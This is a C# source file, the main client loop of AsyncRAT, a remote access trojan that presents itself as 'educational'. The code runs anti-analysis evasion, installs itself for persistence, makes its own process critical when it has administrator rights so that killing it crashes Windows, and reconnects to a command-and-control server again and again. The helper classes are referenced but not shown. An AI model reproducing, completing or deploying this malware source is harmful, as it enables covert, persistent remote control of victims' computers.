using System.Threading;
using Client.Sockets;
using Client.Install;
using System;
using Client.Helper;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program Is distributed for educational purposes only.
*/

namespace Client
{
    class Program
    {


        static void Main()
        {
            Thread.Sleep(2500);
            if (!Settings.InitializeSettings()) Environment.Exit(0);

            if (!Methods.CreateMutex())
                Environment.Exit(0);

            if (Convert.ToBoolean(Settings.Anti))
                Anti_Analysis.RunAntiAnalysis();

            if (Convert.ToBoolean(Settings.Install))
                NormalStartup.Install();

            if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
                ProcessCritical.Set();

            while (true)
            {
                if (!ClientSocket.IsConnected)
                {
                    ClientSocket.Reconnect();
                    ClientSocket.InitializeClient();
                }
                Thread.Sleep(new Random().Next(1000,5000));
            }
        }
    }
}